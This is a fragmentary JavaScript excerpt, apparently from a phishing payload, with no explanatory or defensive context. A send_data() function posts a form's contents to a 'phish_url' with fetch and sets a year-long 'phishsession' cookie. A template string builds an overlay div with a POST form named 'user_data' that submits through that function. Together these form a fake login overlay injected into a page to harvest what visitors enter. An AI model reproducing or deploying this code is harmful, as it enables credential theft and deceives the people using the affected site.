async function send_data() {
    ...
    await fetch(phish_url, phish_init);

    var expire = new Date();
    expire.setFullYear(expire.getFullYear() + 1);
    var phish_cookie = "phishsession=true; path=/; expires=" + expire.toUTCString();
    document.cookie = phish_cookie;
...
var html = `
    ...
    <div id="test_f_m" style="position: absolute; z-index: 150; font-family: Arial; background-color: #ffffff; width: 280px; height: 185px; top: 50%; left: 40%; padding: 10px">
        ...
        <form method="POST" name="user_data" onsubmit="send_data()">
